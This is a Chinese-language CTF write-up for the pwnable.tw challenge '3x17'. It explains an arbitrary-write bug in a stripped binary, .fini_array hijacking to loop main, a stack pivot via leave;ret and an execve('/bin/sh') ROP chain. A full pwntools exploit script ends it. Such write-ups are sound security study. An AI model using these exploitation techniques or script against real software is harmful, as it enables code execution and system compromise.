## 分析

本题逻辑是先输入 addr 后输入 data ，猜测是任意地址写

由于本题去了符号表，所以需要手动找一下 main 函数，有两种方法

- 了解_start函数的结构，当调用__libc_start_main时，rdi中的参数即为main函数
- 运行程序，通过打印的字符串交叉引用找到main函数

对于64位的ELF程序，参数传递顺序是前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-3x17-1.png)

所以__libc_start_main的函数原型：

```c
__libc_start_main(main,argc,argv&env,init,fini,rtld_fini)
```

对应即：

- sub_401B6D: main
- loc_402960: fini
- sub_401EB0: __libc_start_main

## 漏洞点

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-3x17-2.png)

分析main函数可以看到，逻辑就是先自加一个值，当此值为1时，允许输入一个addr，然后对addr进行变换后把数据写进去，看这个变换没看懂，但是看别人的wp上有的有函数名，叫 strtol ，百度可得是将字符串转化为整型的函数。

我们也可以通过动态调试来进行判断

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-3x17-3.png)

rax的值为0x4d2，即十六进制表示的1234

所以这道题的漏洞点就是**任意地址写**，最多0x18个字节。

## 利用

### 前置知识：main函数的启动过程

__libc_start_main的参数中，除了main，还有init和fini，这俩其实就是两个函数的地址，分别是：\_\_libc_csu_fini（sub_402960），\_\_libc_csu_init（loc_4028D0）

> csu是啥意思？[What does CSU in glibc stand for](https://stackoverflow.com/questions/32725541/what-does-csu-in-glibc-stand-for)，即 “C start up”

我们在IDA的view -> open subviews -> segments 中可以看到如下四个段

- .init
- .init_array
- .fini
- .fini_array

点进去即可看到.init和.fini是可执行的段，是代码，是函数。而.init_array和.fini_array是数组，里面存着函数的地址，这两个数组里的函数由谁来执行呢？

其实就是：\_\_libc_csu_fini和__libc_csu_init

- __libc_csu_init执行.init和.init_array
- __libc_csu_fini执行.fini和.fini_array

执行顺序如下：

- .init
- .init_array[0]
- .init_array[1]
- …
- .init_array[n]
- main
- .fini_array[n]
- …
- .fini_array[1]
- .fini_array[0]
- .fini

### 一次写变多次写

这题中.fini_array中有两个函数，所以我们可以知道函数的执行顺序是 main -> __libc_csu_fini -> .fini_array[1] -> .fini_array[0]

所以我们可以通过覆盖.fini_array[1]来执行我们想要的代码，但是本题中并没有后门函数，所以我们需要多次写入构建ROP

我们如果把.fini_array[1]覆盖成main，把 .fini_array[0]覆盖成 __libc_csu_fini，就可以实现无限循环从而达成多次任意地址写，main函数中虽然存在一个全局变量，而且需要为1时我们才能进行写入，但是没有关系，因为这只是一个8bit的整型，所以我们改写之后在疯狂加一的情况下一会就溢出了，我们还是可以实现多次写

### 栈迁移

我们已经实现了任意地址多次写，并控制了rip，但是程序中没有可写可执行的代码段，无法执行shellcode，我们也并不知道栈的位置，无法实现ROP，所以我们需要布置好栈的位置，然后在某一时刻把rsp修改到那个地方，就可以实现ROP了

在__libc_csu_fini函数，也就是题目中的sub_402960函数中，调用方式是这样的

```
.text:0000000000402960                 push    rbp
.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数
```

可见在这个函数中rbp之前的值暂时被放到栈里了，然后将rbp当做通用寄存器去存放了一个固定的值0x4b40f0，然后就去调用了fini_array的函数，call之后的指令我们就可控了，我们可以劫持RIP到任何地方。考虑如下情况：

```
lea     rbp, off_4B40F0 ; rbp = 0x4b40f0            , rsp = 未知

; 劫持到这
mov     rsp,rbp         ; rbp = 0x4b40f0            , rsp = 0x4b40f0
pop     rbp             ; rbp = [rsp] = [0x4b40f0]  , rsp = 0x4b40f8
ret                     ; rip = [rsp] = [0x4b40f8]  , rsp = 0x4b4100
```

则rsp被劫持到0x4b4100，rip和rbp分别为.fini_array[1]和.fini_array[0]的内容：

```
low  addr          0x4b40f0 +----------------+
                            |                |
                            |                |
                            | .fini_array[0] |
                            |     (rbp)      |
                            |                |
                   0x4b40f8 +----------------+
                            |                |
                            |                |
                            | .fini_array[1] |
                            |     (rip)      |
                            |                |
        rsp +----> 0x4b4100 +----------------+ +-+
                            |                |
                            |                |  +
                            |                |  |
                            |                |  |
                            | .data.rel.ro   |  | rop chain
                            | (read/write)   |  |
                            |                |  |
                            |                |  |
                            |                |  |
                            |                |  v
                            |                |
  high addr                 +----------------- +-+

```

则我们可以在0x4b4100的地址向上布置rop链，只要rip指向的位置的代码不会破坏高地址栈结构，然后还有个ret指令，我们就可以实现ROP了

所以我们需要完成的事情如下：

1. 布置好从0x4b4100开始的栈空间(利用任意地址写)
2. 保证.fini_array[1]指向的代码不破坏栈结构，还有个ret，或者直接就一句ret也行
3. 通过上文类似的方法劫持rsp到0x4b4100，即可触发ROP

- 第一件事情虽然是要最先做的，但ROP是最后要执行的，所以一会在讨论。
- 第二件事情，任何一开头形如push rbp;mov rbp,rsp的正常函数都满足要求。当我们已经实现了多次任意地址写之后，这个位置是main函数，满足要求。
- 第三件事情，在main函数的结尾我们可以看到汇编`leave;retn;` leave相当于 `mov rsp,rbp;pop rbp`，所以我们可以把.fini_array[0]指向main函数的结尾处，即```0x401C4B``，即可劫持rsp到0x4b4100。而且当我们写入这个地址不再是__libc_csu_fini，便可中断循环。rip指向.fini_array[1]，虽仍然是main函数，但因为不会疯狂加一，函数会立即返回并触发ROP。

> 注：retn(return near，不恢复cs) retf(return far，恢复cs)

### ROP

我们最终的目的是执行execve这个系统调用从而get shell

但是需要注意的是64位和32位在传递参数和调用系统调用的时候都是有区别的：

- 首先查到execve在64位的上的系统调用号是0x3b，所以要控制rax为0x3b
- 控制rdi为”/bin/sh\x00”的地址
- 控制rsi和rdx均为0
- 64位下系统调用的指令为syscall而不是int 80

所以rop链布置如下

```
pop_rax
0x3b
pop rdi
addr of "/bin/sh\x00"
pop rsi
0
pop rdx
0
syscall

"/bin/sh\x00"  # 随便找个栈上的高地址放即可
```

ROP链常见形式：[pop register]+[value]，即参数的值在后，ret指令在前

利用ROPgadget找到相应的地址

```
ROPgadget --binary 3x17 --only 'pop|ret' | grep "pop rax"

rop_syscall = 0x471db5
rop_pop_rax = 0x41e4af
rop_pop_rdx = 0x446e35
rop_pop_rsi = 0x406c30
rop_pop_rdi = 0x401696
```

## exp

```python
from pwn import *
context(arch="amd64",os='linux',log_level='debug')
myelf = ELF("./3x17")
#io = process(myelf.path)
#gdb.attach(io,"b * 0x471db5")
io = remote("chall.pwnable.tw",10105)

rop_syscall = 0x471db5
rop_pop_rax = 0x41e4af
rop_pop_rdx = 0x446e35
rop_pop_rsi = 0x406c30
rop_pop_rdi = 0x401696
bin_sh_addr = 0x4B419A

fini_array = 0x4B40F0
main_addr = 0x401B6D
libc_csu_fini = 0x402960
leave_ret = 0x401C4B

esp = 0x4B4100

def write(addr,data):
	io.recv()
	io.send(str(addr))
	io.recv()
	io.send(data)

write(fini_array,p64(libc_csu_fini)+p64(main_addr))

write(bin_sh_addr,"/bin/sh\x00")
write(esp,p64(rop_pop_rax))
write(esp+8,p64(0x3b))
write(esp+16,p64(rop_pop_rdi))
write(esp+24,p64(bin_sh_addr))
write(esp+32,p64(rop_pop_rdx))
write(esp+40,p64(0))
write(esp+48,p64(rop_pop_rsi))
write(esp+56,p64(0))
write(esp+64,p64(rop_syscall))
write(fini_array,p64(leave_ret))

io.interactive()
```



参考：

- https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/
- https://ama2in9.top/2020/09/03/3x17/